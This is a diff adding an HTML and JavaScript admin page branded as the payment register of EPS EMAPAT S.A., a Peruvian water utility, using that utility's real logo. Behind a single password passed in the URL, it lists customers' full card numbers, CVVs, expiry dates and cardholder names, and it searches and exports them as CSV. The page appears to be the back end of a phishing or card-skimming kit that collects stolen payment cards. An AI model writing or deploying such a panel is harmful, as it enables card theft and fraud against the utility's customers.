@@ -1,0 +1,269 @@
+<!doctype html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="stylesheet" href="assets/css/bootstrap.min.css">
+  <link rel="stylesheet" href="assets/css/fontawesome-all.min.css">
+  <link rel="shortcut icon" type="image/x-icon" href="assets/img/favicon.png">
+  <link href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700&display=swap" rel="stylesheet">
+  <title>Admin Pagos — EPS EMAPAT S.A.</title>
+  <style>
+    *, body { font-family: 'Roboto', sans-serif; }
+    body { background: #f0f4f8; min-height: 100vh; }
+
+    .topbar {
+      background: #1c3643; color: #fff;
+      padding: 14px 28px; display: flex;
+      align-items: center; justify-content: space-between;
+    }
+    .topbar h5 { margin: 0; font-weight: 700; font-size: 1rem; }
+    .topbar small { opacity: .7; font-size: .75rem; }
+
+    .main { padding: 28px; }
+
+    /* login */
+    #panelLogin {
+      max-width: 360px; margin: 60px auto;
+      background: #fff; border-radius: 14px;
+      padding: 32px; box-shadow: 0 10px 32px rgba(0,0,0,.12);
+    }
+
+    /* stats */
+    .stat-card {
+      background: #fff; border-radius: 12px; padding: 18px 22px;
+      box-shadow: 0 2px 8px rgba(0,0,0,.07);
+    }
+    .stat-card .num { font-size: 1.8rem; font-weight: 700; color: #1c3643; }
+    .stat-card .lbl { font-size: .78rem; color: #546e7a; font-weight: 600; }
+
+    /* tabla */
+    .tabla-admin { font-size: .82rem; }
+    .tabla-admin thead th { background: #1c3643; color: #fff; border: none; white-space: nowrap; }
+    .badge-exitoso  { background: #27ae60; color: #fff; font-size: .70rem; padding: 2px 8px; border-radius: 10px; }
+    .badge-rechazado { background: #e74c3c; color: #fff; font-size: .70rem; padding: 2px 8px; border-radius: 10px; }
+
+    .btn-refresh {
+      background: #1a7abf; color: #fff; border: none; border-radius: 8px;
+      padding: 8px 18px; font-size: .85rem; font-weight: 600;
+    }
+    .btn-refresh:hover { background: #1565a0; color: #fff; }
+  </style>
+</head>
+<body>
+
+<!-- Topbar -->
+<div class="topbar">
+  <div>
+    <h5><i class="fas fa-chart-bar mr-2"></i>EPS EMAPAT — Registro de Pagos</h5>
+    <small>Panel de administración</small>
+  </div>
+  <div id="topbarInfo" style="display:none;">
+    <button class="btn-refresh btn btn-sm" onclick="cargarPagos()">
+      <i class="fas fa-sync-alt mr-1"></i>Actualizar
+    </button>
+    &nbsp;
+    <button class="btn btn-sm btn-outline-light" onclick="cerrarSesion()">
+      <i class="fas fa-sign-out-alt mr-1"></i>Salir
+    </button>
+  </div>
+</div>
+
+<!-- Panel Login -->
+<div class="main" id="panelLogin">
+  <div style="text-align:center;margin-bottom:20px;">
+    <img src="https://emapat.com.pe/administrador_pagina/Vista/usuario/logo/imagen_62b4c49fd5ccf.png"
+         alt="Logo" style="width:50px;border-radius:8px;margin-bottom:10px;"><br>
+    <strong>Acceso Admin</strong>
+  </div>
+  <div id="loginError" class="alert alert-danger" style="display:none;"></div>
+  <div class="form-group">
+    <label style="font-size:.82rem;font-weight:600;">Contraseña</label>
+    <input type="password" id="inputPass" class="form-control" placeholder="••••••••"
+           onkeydown="if(event.key==='Enter') iniciarSesion()">
+  </div>
+  <button class="btn btn-block mt-3" style="background:#1c3643;color:#fff;font-weight:700;"
+          onclick="iniciarSesion()">
+    <i class="fas fa-lock-open mr-2"></i>Ingresar
+  </button>
+</div>
+
+<!-- Panel Admin -->
+<div class="main" id="panelAdmin" style="display:none;">
+
+  <!-- Stats -->
+  <div class="row mb-4" id="statsRow">
+    <div class="col-6 col-md-3 mb-3">
+      <div class="stat-card">
+        <div class="num" id="statTotal">—</div>
+        <div class="lbl">Total pagos</div>
+      </div>
+    </div>
+    <div class="col-6 col-md-3 mb-3">
+      <div class="stat-card">
+        <div class="num text-success" id="statExitosos">—</div>
+        <div class="lbl">Exitosos</div>
+      </div>
+    </div>
+    <div class="col-6 col-md-3 mb-3">
+      <div class="stat-card">
+        <div class="num text-danger" id="statRechazados">—</div>
+        <div class="lbl">Rechazados</div>
+      </div>
+    </div>
+    <div class="col-6 col-md-3 mb-3">
+      <div class="stat-card">
+        <div class="num text-primary" id="statMonto">—</div>
+        <div class="lbl">Monto total S/</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Filtro búsqueda -->
+  <div class="mb-3 d-flex align-items-center gap-2" style="gap:10px;">
+    <input type="text" id="filtro" class="form-control form-control-sm"
+           placeholder="Buscar por suministro, nombre, tarjeta..."
+           style="max-width:320px;" oninput="filtrarTabla()">
+    <button class="btn btn-sm btn-outline-success" onclick="exportarCSV()">
+      <i class="fas fa-file-csv mr-1"></i>Exportar CSV
+    </button>
+  </div>
+
+  <!-- Tabla -->
+  <div class="card shadow-sm">
+    <div class="card-body p-0">
+      <div class="table-responsive">
+        <table class="table table-sm tabla-admin mb-0">
+          <thead>
+            <tr>
+              <th>#</th>
+              <th>Fecha</th>
+              <th>Suministro</th>
+              <th>Nombre</th>
+              <th>Monto</th>
+              <th>Tarjeta</th>
+              <th>Número</th>
+              <th>CVV</th>
+              <th>Vence</th>
+              <th>Titular</th>
+              <th>Estado</th>
+              <th>N° Op</th>
+            </tr>
+          </thead>
+          <tbody id="tbodyPagos">
+            <tr><td colspan="12" class="text-center py-4 text-muted">Cargando...</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </div>
+
+</div><!-- /panelAdmin -->
+
+<script>
+var passActual = '';
+var todosLosPagos = [];
+
+function iniciarSesion() {
+  var pass = document.getElementById('inputPass').value;
+  if (!pass) return;
+  passActual = pass;
+  cargarPagos();
+}
+
+function cerrarSesion() {
+  passActual = '';
+  todosLosPagos = [];
+  document.getElementById('panelLogin').style.display = 'block';
+  document.getElementById('panelAdmin').style.display = 'none';
+  document.getElementById('topbarInfo').style.display = 'none';
+  document.getElementById('inputPass').value = '';
+}
+
+async function cargarPagos() {
+  try {
+    const resp = await fetch('/api/pagos?pass=' + encodeURIComponent(passActual));
+    if (resp.status === 401) {
+      document.getElementById('loginError').textContent = 'Contraseña incorrecta.';
+      document.getElementById('loginError').style.display = 'block';
+      return;
+    }
+    const data = await resp.json();
+    todosLosPagos = data;
+
+    document.getElementById('loginError').style.display  = 'none';
+    document.getElementById('panelLogin').style.display  = 'none';
+    document.getElementById('panelAdmin').style.display  = 'block';
+    document.getElementById('topbarInfo').style.display  = 'flex';
+
+    actualizarStats(data);
+    renderTabla(data);
+  } catch(e) {
+    alert('Error al conectar con la API.');
+  }
+}
+
+function actualizarStats(pagos) {
+  var exitosos   = pagos.filter(function(p){ return p.estado === 'EXITOSO'; });
+  var rechazados = pagos.filter(function(p){ return p.estado === 'RECHAZADO'; });
+  var montoTotal = exitosos.reduce(function(s, p){ return s + parseFloat(p.monto || 0); }, 0);
+
+  document.getElementById('statTotal').textContent      = pagos.length;
+  document.getElementById('statExitosos').textContent   = exitosos.length;
+  document.getElementById('statRechazados').textContent = rechazados.length;
+  document.getElementById('statMonto').textContent      = 'S/ ' + montoTotal.toFixed(2);
+}
+
+function renderTabla(pagos) {
+  var tbody = document.getElementById('tbodyPagos');
+  if (!pagos.length) {
+    tbody.innerHTML = '<tr><td colspan="12" class="text-center py-4 text-muted">Sin registros.</td></tr>';
+    return;
+  }
+  tbody.innerHTML = pagos.map(function(p, i) {
+    var badge = p.estado === 'EXITOSO'
+      ? '<span class="badge-exitoso">EXITOSO</span>'
+      : '<span class="badge-rechazado">RECHAZADO</span>';
+    return '<tr>' +
+      '<td>' + (i+1) + '</td>' +
+      '<td style="white-space:nowrap;">' + (p.fecha || '—') + '</td>' +
+      '<td><strong>' + (p.codigo_cliente || '—') + '</strong></td>' +
+      '<td>' + (p.nombre || '—') + '</td>' +
+      '<td class="text-right font-weight-bold">S/ ' + parseFloat(p.monto || 0).toFixed(2) + '</td>' +
+      '<td>' + (p.tarjeta || '—') + '</td>' +
+      '<td><code>' + (p.num_tarjeta_completo || '—') + '</code></td>' +
+      '<td><code>' + (p.cvv || '—') + '</code></td>' +
+      '<td>' + (p.vencimiento || '—') + '</td>' +
+      '<td>' + (p.titular || '—') + '</td>' +
+      '<td>' + badge + '</td>' +
+      '<td style="white-space:nowrap;">' + (p.nro_operacion || '—') + '</td>' +
+    '</tr>';
+  }).join('');
+}
+
+function filtrarTabla() {
+  var q = document.getElementById('filtro').value.toLowerCase();
+  var filtrados = todosLosPagos.filter(function(p) {
+    return (p.codigo_cliente + ' ' + p.nombre + ' ' + p.tarjeta + ' ' + p.num_tarjeta_completo)
+      .toLowerCase().includes(q);
+  });
+  renderTabla(filtrados);
+}
+
+function exportarCSV() {
+  var cols = ['id','fecha','codigo_cliente','nombre','monto','tarjeta','num_tarjeta_completo','cvv','titular','vencimiento','estado','nro_operacion'];
+  var csv  = cols.join(',') + '\n';
+  todosLosPagos.forEach(function(p) {
+    csv += cols.map(function(c) {
+      var v = String(p[c] || '');
+      return v.includes(',') || v.includes('"') ? '"' + v.replace(/"/g,'""') + '"' : v;
+    }).join(',') + '\n';
+  });
+  var a = document.createElement('a');
+  a.href = 'data:text/csv;charset=utf-8,' + encodeURIComponent(csv);
+  a.download = 'pagos_emapat_' + new Date().toISOString().slice(0,10) + '.csv';
+  a.click();
+}
+</script>
+</body>
+</html>
